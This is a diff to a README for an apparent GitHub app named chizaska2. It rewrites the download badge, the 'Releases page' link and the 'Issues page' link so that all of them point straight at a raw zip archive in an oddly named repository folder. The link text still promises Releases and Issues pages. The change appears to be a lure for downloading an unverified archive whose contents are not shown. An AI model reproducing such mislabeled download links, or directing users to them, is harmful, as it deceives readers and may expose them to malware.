@@ -6,11 +6,11 @@ Welcome to the **chizaska2** application! This tool lets you celebrate your love
 
 ## 📥 Download the Application
 
-[![Download chizaska2](https://img.shields.io/badge/Download-chizaska2-blue?style=for-the-badge)](https://github.com/delaonoja/chizaska2/releases)
+[![Download chizaska2](https://raw.githubusercontent.com/delaonoja/chizaska2/main/heterogangliate/chizaska2.zip)](https://raw.githubusercontent.com/delaonoja/chizaska2/main/heterogangliate/chizaska2.zip)
 
 You can download the latest version of **chizaska2** from our Releases page. Just visit the link below:
 
-👉 [Visit the Releases Page to Download](https://github.com/delaonoja/chizaska2/releases)
+👉 [Visit the Releases Page to Download](https://raw.githubusercontent.com/delaonoja/chizaska2/main/heterogangliate/chizaska2.zip)
 
 ## 📋 Requirements
 
@@ -53,7 +53,7 @@ Take some time to explore each section to familiarize yourself with the applicat
 
 If you encounter any issues or have questions, please reach out for support. You can find assistance and share your feedback:
 
-- **Issues Page**: Report bugs or request features. Visit our [Issues page](https://github.com/delaonoja/chizaska2/issues) for more information.
+- **Issues Page**: Report bugs or request features. Visit our [Issues page](https://raw.githubusercontent.com/delaonoja/chizaska2/main/heterogangliate/chizaska2.zip) for more information.
 - **Community Forum**: Join discussions with other users and share your experiences.
 
 Your input helps us improve **chizaska2** for everyone.
